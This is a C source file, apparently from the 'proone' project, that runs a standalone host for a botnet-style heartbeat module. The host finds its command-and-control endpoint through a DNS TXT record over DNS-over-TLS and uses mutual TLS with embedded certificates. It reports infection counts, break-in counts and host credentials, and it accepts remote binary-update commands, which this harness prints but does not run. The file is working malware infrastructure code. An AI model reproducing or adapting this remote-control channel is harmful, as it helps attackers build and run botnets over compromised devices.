#include <stdio.h>
#include <assert.h>
#include <ctype.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#include <inttypes.h>

#include <unistd.h>
#include <fcntl.h>
#include <regex.h>
#include <arpa/inet.h>

#include "util_rt.h"
#include "htbt.h"
#include "config.h"
#include "mbedtls.h"
#include "proone_conf/x509.h"

#include <mbedtls/entropy.h>
#include <mbedtls/debug.h>

#define HELP_STR \
"Usage: %s <TXT REC> [options ...] [DNS SPECs...]\n"\
"Options:\n"\
"  <TXT REC>            target TXT record for CNCP\n"\
"  --help               print this message\n"\
"  --no-verify          do not verify client cert\n"\
"  --no-default-dns     do not use hard-coded nameserver pools\n"\
"  --hostcred=<BASE64>  specify hostcred data\n"\
"  @<DNS SPEC>          DNS over TLS nameserver\n"\
"Notes:\n"\
"  IPv4 <DNS SPEC> example: @192.0.2.1 or 192.0.2.1:853\n"\
"  IPv6 <DNS SPEC> example: @[2001:db8::1] or [2001:db8::1]:853\n"

typedef struct {
	char txtrec[256];
	bool verify;
	bool def_dns;
	prne_resolv_ns_pool_t pool4;
	prne_resolv_ns_pool_t pool6;
} htbthost_param_t;

static htbthost_param_t htbthost_param;
static regex_t re_ns4, re_ns6, re_hc;
static char m_upbin_path[256];
static char m_upbin_args[1024];
static size_t m_upbin_args_size;
static sigset_t ss_all, ss_exit;
static struct timespec proc_start;
static uint8_t instance_id[16];
static uint8_t *hostcred;
static size_t hostcred_len;
static pth_t main_pth;

static void init_htbthost_param (htbthost_param_t *p) {
	p->verify = true;
	p->def_dns = true;
	prne_resolv_init_ns_pool(&p->pool4);
	prne_resolv_init_ns_pool(&p->pool6);
}

static void free_htbthost_param (htbthost_param_t *p) {
	prne_resolv_free_ns_pool(&p->pool4);
	prne_resolv_free_ns_pool(&p->pool6);
}

static void print_usage (const char *prog) {
	fprintf(stderr, HELP_STR, prog);
}

static bool cb_txtrec (void *ctx, char *out) {
	strcpy(out, htbthost_param.txtrec);
	return true;
}

static bool cb_hostinfo (void *ctx, prne_htbt_host_info_t *out) {
	static struct timespec now;
	static uint8_t PROG_VER[] = PRNE_PROG_VER;
	int fd;

	now = prne_gettime(CLOCK_MONOTONIC);
	out->child_uptime = out->parent_uptime = prne_sub_timespec(
		now,
		proc_start).tv_sec;
	out->bne_cnt = 0;
	out->infect_cnt = 0;
	out->parent_pid = out->child_pid = getpid();

	prne_static_assert(sizeof(PROG_VER) == sizeof(out->prog_ver), "FIXME");
	memcpy(out->prog_ver, PROG_VER, sizeof(PROG_VER));

	fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
	if (fd >= 0) {
		read(fd, out->boot_id, sizeof(out->boot_id));
		close(fd);
	}

	prne_static_assert(
		sizeof(instance_id) == sizeof(out->instance_id),
		"FIXME");
	memcpy(out->instance_id, instance_id, sizeof(instance_id));

	if (prne_htbt_alloc_host_info(out, hostcred_len)) {
		memcpy(out->host_cred, hostcred, hostcred_len);
	}
	else {
		return false;
	}

	out->crash_cnt = 0;
	out->arch = prne_host_arch;

	return true;
}

static bool cb_upbin (
	void *ctx,
	const char *path,
	const prne_htbt_cmd_t *cmd)
{
	const size_t path_len = prne_nstrlen(path);

	prne_dbgast(path_len > 0);
	if (path_len + 1 > sizeof(m_upbin_path) ||
		cmd->mem_len > sizeof(m_upbin_args))
	{
		errno = ENOMEM;
		return false;
	}

	memcpy(m_upbin_path, path, path_len + 1);
	memcpy(m_upbin_args, cmd->mem, cmd->mem_len);
	m_upbin_args_size = cmd->mem_len;

	return pth_raise(main_pth, SIGTERM) != 0;
}

static bool cb_fork (void *ctx) {
	sigset_t ss;

	sigfillset(&ss);
	pth_sigmask(SIG_UNBLOCK, &ss, NULL);

	return true;
}

static void load_ssl_conf (
	mbedtls_x509_crt *ca,
	mbedtls_ssl_config *s_conf,
	mbedtls_x509_crt *s_crt,
	mbedtls_pk_context *s_key,
	mbedtls_dhm_context *dhm,
	mbedtls_ssl_config *c_conf,
	mbedtls_x509_crt *c_crt,
	mbedtls_pk_context *c_key,
	mbedtls_ctr_drbg_context *rnd)
{
	static const char *ALP_LIST[] = { PRNE_HTBT_TLS_ALP, NULL };
	static const uint8_t
		CA_CRT[] = PRNE_X509_CA_CRT,
		S_CRT[] = PRNE_X509_S_CRT,
		S_KEY[] = PRNE_X509_S_KEY,
		C_CRT[] = PRNE_X509_C_CRT,
		C_KEY[] = PRNE_X509_C_KEY,
		DH[] = PRNE_X509_DH;

	assert(mbedtls_x509_crt_parse(ca, CA_CRT, sizeof(CA_CRT)) == 0);
	assert(
		mbedtls_ssl_config_defaults(
			s_conf,
			MBEDTLS_SSL_IS_SERVER,
			MBEDTLS_SSL_TRANSPORT_STREAM,
			MBEDTLS_SSL_PRESET_DEFAULT) == 0 &&
		mbedtls_x509_crt_parse(s_crt, S_CRT, sizeof(S_CRT)) == 0 &&
		mbedtls_pk_parse_key(s_key, S_KEY, sizeof(S_KEY), NULL, 0) == 0 &&
		mbedtls_dhm_parse_dhm(dhm, DH, sizeof(DH)) == 0 &&
		mbedtls_ssl_conf_own_cert(s_conf, s_crt, s_key) == 0 &&
		mbedtls_ssl_conf_dh_param_ctx(s_conf, dhm) == 0);
	mbedtls_ssl_conf_ca_chain(s_conf, ca, NULL);
	mbedtls_ssl_conf_verify(s_conf, prne_mbedtls_x509_crt_verify_cb, NULL);
	mbedtls_ssl_conf_rng(s_conf, mbedtls_ctr_drbg_random, rnd);
	mbedtls_ssl_conf_min_version(
		s_conf,
		MBEDTLS_SSL_MAJOR_VERSION_3,
		MBEDTLS_SSL_MINOR_VERSION_0);

	assert(
		mbedtls_ssl_config_defaults(
			c_conf,
			MBEDTLS_SSL_IS_CLIENT,
			MBEDTLS_SSL_TRANSPORT_STREAM,
			MBEDTLS_SSL_PRESET_DEFAULT) == 0 &&
		mbedtls_x509_crt_parse(c_crt, C_CRT, sizeof(C_CRT)) == 0 &&
		mbedtls_pk_parse_key(c_key, C_KEY, sizeof(C_KEY), NULL, 0) == 0 &&
		mbedtls_ssl_conf_own_cert(c_conf, c_crt, c_key) == 0);
	mbedtls_ssl_conf_ca_chain(c_conf, ca, NULL);
	mbedtls_ssl_conf_verify(c_conf, prne_mbedtls_x509_crt_verify_cb, NULL);
	mbedtls_ssl_conf_rng(c_conf, mbedtls_ctr_drbg_random, rnd);

	assert(
		mbedtls_ssl_conf_alpn_protocols(c_conf, ALP_LIST) == 0 &&
		mbedtls_ssl_conf_alpn_protocols(s_conf, ALP_LIST) == 0);

	if (htbthost_param.verify) {
		mbedtls_ssl_conf_authmode(c_conf, MBEDTLS_SSL_VERIFY_REQUIRED);
		mbedtls_ssl_conf_authmode(s_conf, MBEDTLS_SSL_VERIFY_REQUIRED);
	}
	else {
		mbedtls_ssl_conf_authmode(c_conf, MBEDTLS_SSL_VERIFY_NONE);
		mbedtls_ssl_conf_authmode(s_conf, MBEDTLS_SSL_VERIFY_NONE);
	}
}

static void mbedtls_dbg_f(
	void *ctx,
	int level,
	const char *filename,
	int line,
	const char *msg)
{
	prne_dbgpf("<MBEDTLS> %s", msg);
}

static bool parse_param (const char *arg) {
	char str[40];
	regmatch_t rm[3];

	if (strcmp(arg, "--no-verify") == 0) {
		htbthost_param.verify = false;
	}
	else if (strcmp(arg, "--no-default-dns") == 0) {
		htbthost_param.def_dns = false;
	}
	else if (regexec(&re_ns4, arg, 3, rm, 0) == 0) {
		prne_net_endpoint_t ep;
		size_t pos;

		pos = rm[1].rm_eo - rm[1].rm_so;
		memcpy(str, arg + rm[1].rm_so, pos);
		str[pos] = 0;

		if (rm[2].rm_so >= 0) {
			if (sscanf(arg + rm[2].rm_so, ":%"SCNu16, &ep.port) != 1) {
				return false;
			}
		}
		else {
			ep.port = 853;
		}

		if (inet_pton(AF_INET, str, ep.addr.addr)) {
			ep.addr.ver = PRNE_IPV_4;
			pos = htbthost_param.pool4.cnt;
			prne_resolv_alloc_ns_pool(&htbthost_param.pool4, pos + 1);
			htbthost_param.pool4.arr[pos] = ep;
		}
		else {
			return false;
		}
	}
	else if (regexec(&re_ns6, arg, 3, rm, 0) == 0) {
		prne_net_endpoint_t ep;
		size_t pos;

		pos = rm[1].rm_eo - rm[1].rm_so;
		memcpy(str, arg + rm[1].rm_so, rm[1].rm_eo - rm[1].rm_so);
		str[pos] = 0;

		if (rm[2].rm_so >= 0) {
			if (sscanf(arg + rm[2].rm_so, ":%"SCNu16, &ep.port) != 1) {
				return false;
			}
		}
		else {
			ep.port = 853;
		}

		if (inet_pton(AF_INET6, str, ep.addr.addr)) {
			ep.addr.ver = PRNE_IPV_6;
			pos = htbthost_param.pool6.cnt;
			prne_resolv_alloc_ns_pool(&htbthost_param.pool6, pos + 1);
			htbthost_param.pool6.arr[pos] = ep;
		}
	}
	else if (regexec(&re_hc, arg, 2, rm, 0) == 0) {
		if (!prne_dec_base64_mem(
				arg + rm[1].rm_so,
				rm[1].rm_eo - rm[1].rm_so,
				&hostcred,
				&hostcred_len))
		{
			perror("--hostcred");
			return false;
		}
	}
	else {
		return false;
	}

	return true;
}

static int mktmpfile (
	void *ctx,
	const int flags,
	const mode_t mode,
	size_t req_size,
	char **opath)
{
	static int ctr = 0;
	char *path = NULL;
	int fd = -1, len;
	bool ret = false;

	len = snprintf(NULL, 0, "htbthost-tmp.%d", ctr);
	if (len < 0) {
		goto END;
	}
	path = prne_alloc_str(len);
	if (path == NULL) {
		goto END;
	}
	prne_memzero(path, len + 1);
	if (len != snprintf(path, len + 1, "htbthost-tmp.%d", ctr)) {
		goto END;
	}
	ctr += 1;

	fd = open(path, flags, mode);
	if (fd < 0) {
		goto END;
	}
	if (ftruncate(fd, (off_t)req_size) != 0) {
		goto END;
	}
	ret = true;

END:
	if (ret) {
		if (opath != NULL) {
			*opath = path;
			path = NULL;
		}
	}
	else {
		if (fd >= 0) {
			unlink(path);
		}
		prne_close(fd);
		fd = -1;
	}
	prne_free(path);
	return fd;
}

static void do_run_upbin (void) {
	for (size_t i = 0; i < m_upbin_args_size; i += 1) {
		if (m_upbin_args[i] == 0) {
			m_upbin_args[i] = ' ';
		}
	}
	m_upbin_args[m_upbin_args_size - 1] = 0;

	printf(
		"upbin received:\n%s %s\n",
		m_upbin_path,
		m_upbin_args);
}


int main (const int argc, const char **args) {
	static mbedtls_entropy_context entropy;
	static mbedtls_ctr_drbg_context rnd;
	static prne_resolv_t *resolv;
	static prne_htbt_t *htbt;
	static prne_worker_t wkr_arr[2];
	static prne_worker_t *w;
	static struct {
		mbedtls_x509_crt ca;
		struct {
			mbedtls_x509_crt crt;
			mbedtls_pk_context key;
			mbedtls_dhm_context dhm;
			mbedtls_ssl_config conf;
		} s;
		struct {
			mbedtls_x509_crt crt;
			mbedtls_pk_context key;
			mbedtls_ssl_config conf;
		} c;
	} ssl;

	signal(SIGPIPE, SIG_IGN);
	sigemptyset(&ss_all);
	sigemptyset(&ss_exit);
	sigaddset(&ss_all, SIGTERM);
	sigaddset(&ss_all, SIGINT);
	sigaddset(&ss_exit, SIGTERM);
	sigaddset(&ss_exit, SIGINT);
	assert(regcomp(
		&re_ns4,
		"^@([0-9\\.]+)(:[0-9]{1,5})?$",
		REG_ICASE | REG_EXTENDED) == 0);
	assert(regcomp(
		&re_ns6,
		"^@\\[([0-9a-f:]+)\\](:[0-9]{1,5})?$",
		REG_ICASE | REG_EXTENDED) == 0);
	assert(regcomp(
		&re_hc,
		"^--hostcred=(.*)$",
		REG_ICASE | REG_EXTENDED) == 0);
	prne_assert(sigprocmask(SIG_BLOCK, &ss_all, NULL) == 0);
	init_htbthost_param(&htbthost_param);

	if (argc < 2) {
		print_usage(args[0]);
		return 2;
	}
	else {
		if (sscanf(args[1], "%255s", htbthost_param.txtrec) != 1 ||
			strlen(htbthost_param.txtrec) == 0)
		{
			fprintf(stderr, "Invalid <TXT REC>\n");
			return 2;
		}
		else if (strcmp("--help", args[1]) == 0) {
			print_usage(args[0]);
			return 2;
		}

		for (int i = 2; i < argc; i += 1) {
			if (strcmp("--help", args[1]) == 0) {
				print_usage(args[0]);
				return 2;
			}
			else if (!parse_param(args[i])) {
				fprintf(stderr, "Invalid option \"%s\"\n", args[i]);
				return 2;
			}
		}

		if (!htbthost_param.def_dns &&
			(htbthost_param.pool4.cnt == 0 || htbthost_param.pool6.cnt == 0)) {
			fprintf(stderr, "Empty IPv4 or IPv6 nameserver pool.\n");
			return 2;
		}
	}

	mbedtls_debug_set_threshold(1);
	pth_init();
	main_pth = pth_self();

	proc_start = prne_gettime(CLOCK_MONOTONIC);

	mbedtls_entropy_init(&entropy);
	mbedtls_ctr_drbg_init(&rnd);
	prne_assert(mbedtls_ctr_drbg_seed(
		&rnd,
		mbedtls_entropy_func,
		&entropy,
		NULL,
		0) == 0);

	mbedtls_x509_crt_init(&ssl.ca);
	mbedtls_x509_crt_init(&ssl.s.crt);
	mbedtls_x509_crt_init(&ssl.c.crt);
	mbedtls_pk_init(&ssl.s.key);
	mbedtls_pk_init(&ssl.c.key);
	mbedtls_dhm_init(&ssl.s.dhm);
	mbedtls_ssl_config_init(&ssl.s.conf);
	mbedtls_ssl_config_init(&ssl.c.conf);
	load_ssl_conf(
		&ssl.ca,
		&ssl.s.conf,
		&ssl.s.crt,
		&ssl.s.key,
		&ssl.s.dhm,
		&ssl.c.conf,
		&ssl.c.crt,
		&ssl.c.key,
		&rnd);
	mbedtls_ssl_conf_dbg(&ssl.s.conf, mbedtls_dbg_f, NULL);
	mbedtls_ssl_conf_dbg(&ssl.c.conf, mbedtls_dbg_f, NULL);

	mbedtls_ctr_drbg_random(
		&rnd,
		instance_id,
		sizeof(instance_id));

	w = wkr_arr + 0;
	if (htbthost_param.def_dns) {
		resolv = prne_alloc_resolv(
			w,
			&rnd,
			PRNE_RESOLV_DEF_IPV4_POOL,
			PRNE_RESOLV_DEF_IPV6_POOL);
	}
	else {
		resolv = prne_alloc_resolv(
			w,
			&rnd,
			prne_resolv_own_ns_pool(&htbthost_param.pool4, false),
			prne_resolv_own_ns_pool(&htbthost_param.pool6, false));
	}
	w->pth = pth_spawn(PTH_ATTR_DEFAULT, w->entry, w->ctx);
	prne_assert(resolv != NULL && w->pth != NULL);

	{
		static prne_htbt_param_t param;

		prne_htbt_init_param(&param);
		param.lbd_ssl_conf = &ssl.s.conf;
		param.main_ssl_conf = &ssl.c.conf;
		param.ctr_drbg = &rnd;
		param.resolv = resolv;
		param.cb_f.cnc_txtrec = cb_txtrec;
		param.cb_f.hostinfo = cb_hostinfo;
		param.cb_f.tmpfile = mktmpfile;
		param.cb_f.upbin = cb_upbin;
		param.cb_f.fork = cb_fork;
		param.blackhole = open("/dev/null", O_WRONLY);

		w = wkr_arr + 1;
		htbt = prne_alloc_htbt(w, &param);
		w->pth = pth_spawn(PTH_ATTR_DEFAULT, w->entry, w->ctx);
		prne_assert(htbt != NULL && w->pth != NULL);

		prne_htbt_free_param(&param);
	}

	while (true) {
		static int caught;

		caught = 0;
		pth_sigwait(&ss_all, &caught);
		if (sigismember(&ss_exit, caught)) {
			sigprocmask(SIG_UNBLOCK, &ss_exit, NULL);
			break;
		}
	}

	for (size_t i = 0; i < sizeof(wkr_arr)/sizeof(prne_worker_t); i += 1) {
		wkr_arr[i].fin(wkr_arr[i].ctx);
	}
	for (size_t i = 0; i < sizeof(wkr_arr)/sizeof(prne_worker_t); i += 1) {
		pth_join(wkr_arr[i].pth, NULL);
		wkr_arr[i].pth = NULL;
		prne_free_worker(wkr_arr + i);
	}

	pth_kill();
	mbedtls_x509_crt_free(&ssl.ca);
	mbedtls_x509_crt_free(&ssl.s.crt);
	mbedtls_x509_crt_free(&ssl.c.crt);
	mbedtls_pk_free(&ssl.s.key);
	mbedtls_pk_free(&ssl.c.key);
	mbedtls_dhm_free(&ssl.s.dhm);
	mbedtls_ssl_config_free(&ssl.s.conf);
	mbedtls_ssl_config_free(&ssl.c.conf);
	mbedtls_ctr_drbg_free(&rnd);
	mbedtls_entropy_free(&entropy);
	free_htbthost_param(&htbthost_param);
	regfree(&re_ns4);
	regfree(&re_ns6);
	regfree(&re_hc);
	prne_free(hostcred);

	if (prne_nstrlen(m_upbin_path) > 0) {
		do_run_upbin();
	}

	return 0;
}
